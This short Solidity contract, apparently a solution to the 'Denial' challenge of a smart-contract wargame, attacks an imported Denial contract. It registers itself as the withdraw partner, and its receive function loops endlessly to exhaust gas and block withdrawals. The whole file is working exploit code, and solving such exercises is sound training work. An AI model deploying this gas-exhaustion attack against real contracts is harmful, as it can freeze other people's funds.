// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract DenialAttack {
    Denial public d;

    function attack(address payable target) public payable {
        d = Denial(target);
        d.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true) {}
    }
}